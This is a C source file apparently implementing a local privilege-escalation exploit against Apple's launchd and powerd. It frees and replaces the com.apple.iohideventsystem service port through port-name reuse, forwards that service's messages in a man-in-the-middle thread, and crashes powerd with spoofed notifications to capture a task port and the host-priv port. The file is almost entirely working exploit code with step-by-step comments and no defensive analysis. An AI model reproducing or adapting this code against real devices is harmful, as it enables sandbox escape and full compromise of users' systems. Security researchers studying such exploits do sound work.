#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <pthread.h>

#include <mach/mach.h>
#include <mach/mach_error.h>


mach_port_t actual_host_priv = MACH_PORT_NULL;
pthread_mutex_t actual_host_priv_lock = PTHREAD_MUTEX_INITIALIZER;

// servers.h prototypes:
extern kern_return_t
bootstrap_look_up(mach_port_t  bootstrap_port,
                  char*        service_name,
                  mach_port_t* service_port);

extern kern_return_t
bootstrap_register(mach_port_t bootstrap_port,
                   char*       service_name,
                   mach_port_t service_port);

// lookup a launchd service:
mach_port_t lookup(char* name) {
  mach_port_t service_port = MACH_PORT_NULL;
  kern_return_t err = bootstrap_look_up(bootstrap_port, name, &service_port);
  if(err != KERN_SUCCESS){
    printf("unable to look up %s\n", name);
    return MACH_PORT_NULL;
  }
  
  if (service_port == MACH_PORT_NULL) {
    printf("bad service port\n");
    return MACH_PORT_NULL;
  }
  return service_port;
}

/*
 * spoof a no-more-senders notification message
 * this is used to free powerd's task port to crash it
 */

struct notification_msg {
  mach_msg_header_t   not_header;
  NDR_record_t        NDR;
  mach_port_name_t not_port;
};

void spoof(mach_port_t port, uint32_t name) {
  kern_return_t err;
  struct notification_msg not = {0};
  
  not.not_header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
  not.not_header.msgh_size = sizeof(struct notification_msg);
  not.not_header.msgh_remote_port = port;
  not.not_header.msgh_local_port = MACH_PORT_NULL;
  not.not_header.msgh_id = 0110; // MACH_NOTIFY_DEAD_NAME
  
  not.NDR = NDR_record;
  
  not.not_port = name;
  
  // send the fake notification message
  err = mach_msg(&not.not_header,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(struct notification_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
}

// -framework IOKit to get this
kern_return_t
io_ps_copy_powersources_info(mach_port_t,
                             int,
                             vm_address_t*,
                             mach_msg_type_number_t *,
                             int*);

static void* kill_powerd_thread(void* arg){
  mach_port_t service_port = lookup("com.apple.PowerManagement.control");
  
  // free task_self in powerd
  for (int j = 0; j < 2; j++) {
    spoof(service_port, 0x103);
  }
  
  // call _io_ps_copy_powersources_info which has an unchecked vm_allocate which will fail
  // and deref an invalid pointer
  
  vm_address_t buffer = 0;
  vm_size_t size = 0;
  int return_code;
  
  io_ps_copy_powersources_info(service_port,
                               0,
                               &buffer,
                               (mach_msg_type_number_t *) &size,
                               &return_code);
  
  printf("killed powerd?\n");
  
  return NULL;
}

void kill_powerd() {
  pthread_t t;
  pthread_create(&t, NULL, kill_powerd_thread, NULL);
}


/*
 host_service is the service which is hosting the port we want to free (eg the bootstrap port)
 target_port is a send-right to the port we want to get free'd in the host service (eg another service port in launchd)
 */

struct launchd_ool_msg  {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_ports_descriptor_t ool_ports;
};

// this msgh_id is an XPC message
uint32_t msgh_id_to_get_destroyed = 0x10000000;

void do_free(mach_port_t host_service, mach_port_t target_port) {
  kern_return_t err;
  
  int port_count = 0x10000;
  mach_port_t* ports = malloc(port_count * sizeof(mach_port_t));
  for (int i = 0; i < port_count; i++) {
    ports[i] = target_port;
  }
  
  // build the message to free the target port name
  struct launchd_ool_msg* free_msg = malloc(sizeof(struct launchd_ool_msg));
  memset(free_msg, 0, sizeof(struct launchd_ool_msg));
  
  free_msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
  free_msg->hdr.msgh_size = sizeof(struct launchd_ool_msg);
  free_msg->hdr.msgh_remote_port = host_service;
  free_msg->hdr.msgh_local_port = MACH_PORT_NULL;
  free_msg->hdr.msgh_id = msgh_id_to_get_destroyed;
  
  free_msg->body.msgh_descriptor_count = 1;
  
  free_msg->ool_ports.address = ports;
  free_msg->ool_ports.count = port_count;
  free_msg->ool_ports.deallocate = 0;
  free_msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
  free_msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
  free_msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
  
  // send the free message
  err = mach_msg(&free_msg->hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(struct launchd_ool_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  printf("free message: %s\n", mach_error_string(err));
}

void send_looper(mach_port_t service, mach_port_t* ports, uint32_t n_ports, int disposition) {
  kern_return_t err;
  struct launchd_ool_msg msg = {0};
  msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
  msg.hdr.msgh_size = sizeof(msg);
  msg.hdr.msgh_remote_port = service;
  msg.hdr.msgh_local_port = MACH_PORT_NULL;
  msg.hdr.msgh_id = msgh_id_to_get_destroyed;
  
  msg.body.msgh_descriptor_count = 1;
  
  msg.ool_ports.address = (void*)ports;
  msg.ool_ports.count = n_ports;
  msg.ool_ports.disposition = disposition;
  msg.ool_ports.deallocate = 0;
  msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
  
  err = mach_msg(&msg.hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(struct launchd_ool_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  printf("sending l00per: %s\n", mach_error_string(err));
  
  // need to wait a little bit since we don't send a reply port and don't want to fill the queue
  usleep(100);
}

mach_port_right_t right_fixup(mach_port_right_t in) {
  switch (in) {
    case MACH_MSG_TYPE_PORT_SEND:
      return MACH_MSG_TYPE_MOVE_SEND;
    case MACH_MSG_TYPE_PORT_SEND_ONCE:
      return MACH_MSG_TYPE_MOVE_SEND_ONCE;
    case MACH_MSG_TYPE_PORT_RECEIVE:
      return MACH_MSG_TYPE_MOVE_RECEIVE;
    default:
      return 0; // no rights
  }
}

// use the other task port to try to get a send right to the host-priv port
mach_port_t get_host_priv(mach_port_t other_task) {
  mach_port_t our_host = mach_host_self();
  mach_port_t other_host = MACH_PORT_NULL;
  
  kern_return_t err = task_get_special_port(other_task, TASK_HOST_PORT, &other_host);
  if (err != KERN_SUCCESS) {
    printf("failed to get other task's host port\n");
    return MACH_PORT_NULL;
  }
  
  if (other_host != MACH_PORT_NULL && other_host != our_host) {
    printf("got the host priv port, dankeschoen!\n");
    return other_host;
  }
  
  printf("other task has the same host port as us\n");
  
  return MACH_PORT_NULL;
}

void inspect_port(mach_port_t port) {
  pid_t pid = 0;
  pid_for_task(port, &pid);
  if (pid > 0) {
    printf("got task port for pid: %d\n", pid);
  } else {
    return;
  }
  
  mach_port_t host_priv = get_host_priv(port);
  if (host_priv != MACH_PORT_NULL && actual_host_priv == MACH_PORT_NULL){
    actual_host_priv = host_priv;
    pthread_mutex_unlock(&actual_host_priv_lock);
  }
  
  return;
}

/*
 implements the mitm
 replacer_portset contains receive rights for all the ports we send to launchd
 to replace the real service port
 
 real_service_port is a send-right to the actual service
 
 receive messages on replacer_portset, inspect them, then fix them up and send them along
 to the real service
 */
mach_port_t got_replaced_with = MACH_PORT_NULL;

void do_service_mitm(mach_port_t real_service_port, mach_port_t replacer_portset) {
  mach_msg_size_t max_request_size = 0x10000;
  mach_msg_header_t* request = malloc(max_request_size);
  
  for(;;) {
    memset(request, 0, max_request_size);
    kern_return_t err = mach_msg(request,
                                 MACH_RCV_MSG |
                                 MACH_RCV_LARGE, // leave larger messages in the queue
                                 0,
                                 max_request_size,
                                 replacer_portset,
                                 0,
                                 0);
    
    if (err == MACH_RCV_TOO_LARGE) {
      // bump up the buffer size
      mach_msg_size_t new_size = request->msgh_size + 0x1000;
      request = realloc(request, new_size);
      // try to receive again
      continue;
    }
    
    if (err != KERN_SUCCESS) {
      printf("error receiving on port set: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
    
    got_replaced_with = request->msgh_local_port;
    
    printf("got a request, fixing it up...\n");
    
    // fix up the message such that it can be forwarded:
    
    // get the rights we were sent for each port the header
    mach_port_right_t remote = MACH_MSGH_BITS_REMOTE(request->msgh_bits);
    mach_port_right_t voucher = MACH_MSGH_BITS_VOUCHER(request->msgh_bits);
    
    // fixup the header ports:
    // swap the remote port we received into the local port we'll forward
    // this means we're only mitm'ing in one direction - we could also
    // intercept these replies if necessary
    request->msgh_local_port = request->msgh_remote_port;
    request->msgh_remote_port = real_service_port;
    // voucher port stays the same
    
    int is_complex = MACH_MSGH_BITS_IS_COMPLEX(request->msgh_bits);
    
    // (remote, local, voucher)
    request->msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, right_fixup(remote), right_fixup(voucher));
    
    if (is_complex) {
      request->msgh_bits |= MACH_MSGH_BITS_COMPLEX;
      
      // if it's complex we also need to fixup all the descriptors...
      mach_msg_body_t* body = (mach_msg_body_t*)(request+1);
      mach_msg_type_descriptor_t* desc = (mach_msg_type_descriptor_t*)(body+1);
      for (mach_msg_size_t i = 0; i < body->msgh_descriptor_count; i++) {
        switch (desc->type) {
          case MACH_MSG_PORT_DESCRIPTOR: {
            mach_msg_port_descriptor_t* port_desc = (mach_msg_port_descriptor_t*)desc;
            inspect_port(port_desc->name);
            port_desc->disposition = right_fixup(port_desc->disposition);
            desc = (mach_msg_type_descriptor_t*)(port_desc+1);
            break;
          }
            
          case MACH_MSG_OOL_VOLATILE_DESCRIPTOR:
          case MACH_MSG_OOL_DESCRIPTOR: {
            mach_msg_ool_descriptor_t* ool_desc = (mach_msg_ool_descriptor_t*)desc;
            // make sure that deallocate is true; we don't want to keep this memory:
            ool_desc->deallocate = 1;
            desc = (mach_msg_type_descriptor_t*)(ool_desc+1);
            break;
          }

          case MACH_MSG_OOL_PORTS_DESCRIPTOR: {
            mach_msg_ool_ports_descriptor_t* ool_ports_desc = (mach_msg_ool_ports_descriptor_t*)desc;
            // make sure that deallocate is true:
            ool_ports_desc->deallocate = 1;
            ool_ports_desc->disposition = right_fixup(ool_ports_desc->disposition);
            desc = (mach_msg_type_descriptor_t*)(ool_ports_desc+1);
            break;
          }
        }
      }
      
    }
    
    printf("fixed up request, forwarding it\n");
    
    // forward the message:
    err = mach_msg(request,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   request->msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
      printf("error forwarding service message: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
  }
}
mach_port_t thread_real_service_port, thread_replacer_portset;

void* do_mitm_thread(void* arg) {
  do_service_mitm(thread_real_service_port, thread_replacer_portset);
  return NULL;
}

pthread_t mitm_thread;
void start_mitm_thread(mach_port_t real_service_port, mach_port_t replacer_portset) {
  thread_real_service_port = real_service_port;
  thread_replacer_portset = replacer_portset;
  
  pthread_create(&mitm_thread, NULL, do_mitm_thread, NULL);
}

// kill the mitm thread and also destroy the receive right for the service:
void end_mitm() {
  int err = pthread_cancel(mitm_thread);
  if (err != 0) {
    printf("failed to cancel the mitm thread\n");
  }
}

char* default_target_service_name = "com.apple.iohideventsystem";

void launchd_exploit(char* app_group) {
  char* target_service_name = default_target_service_name;
  
  // allocate the receive rights which we will try to replace the service with:
  // (we'll also use them to loop the mach port name in the target)
  size_t n_ports = 0x1000;
  mach_port_t* ports = calloc(sizeof(void*), n_ports);
  for (int i = 0; i < n_ports; i++) {
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
    if (err != KERN_SUCCESS) {
      printf("failed to allocate port: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
    err = mach_port_insert_right(mach_task_self(),
                                 ports[i],
                                 ports[i],
                                 MACH_MSG_TYPE_MAKE_SEND);
    if (err != KERN_SUCCESS) {
      printf("failed to insert send right: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
  }
  
  // generate some service names we can use:
  char** names = calloc(sizeof(char*), n_ports);
  for (int i = 0; i < n_ports; i++) {
    char name[strlen(app_group)+64];
    sprintf(name, "%s.%d", app_group, i);
    names[i] = strdup(name);
  }
  
  // lookup a send right to the target to be replaced
  mach_port_t target_service = lookup(target_service_name);
  
  // free the target in launchd
  do_free(bootstrap_port, target_service);
  
  // send one smaller looper message to push the free'd name down the free list:
  send_looper(bootstrap_port, ports, 0x100, MACH_MSG_TYPE_MAKE_SEND);
  
  // send the larger ones to loop the generation number whilst leaving the name in the middle of the long freelist
  for (int i = 0; i < 62; i++) {
    send_looper(bootstrap_port, ports, 0x200, MACH_MSG_TYPE_MAKE_SEND);
  }
  
  // now that the name should have looped round (and still be near the middle of the freelist
  // try to replace it by registering a lot of new services
  for (int i = 0; i < n_ports; i++) {
    kern_return_t err = bootstrap_register(bootstrap_port, names[i], ports[i]);
    if (err != KERN_SUCCESS) {
      printf("failed to register service %d, continuing anyway...\n", i);
    }
  }
  
  // add all those receive rights to a port set:
  mach_port_t ps;
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_PORT_SET, &ps);
  for (int i = 0; i < n_ports; i++) {
    mach_port_move_member(mach_task_self(), ports[i], ps);
  }
  
  start_mitm_thread(target_service, ps);
  
  kill_powerd();
  
  return;
}

mach_port_t get_host_priv_port(char* app_group, mach_port_t* _real_service_port, mach_port_t* _mitm_port) {
  pthread_mutex_lock(&actual_host_priv_lock);
  
  launchd_exploit(app_group);
  pthread_mutex_lock(&actual_host_priv_lock);
  
  // stop receiving on the mitm_port:
  end_mitm();
  
  // we'll need these to clean up after the kernel exploit
  *_real_service_port = thread_real_service_port;
  *_mitm_port = got_replaced_with;
  
  
  return actual_host_priv;
}

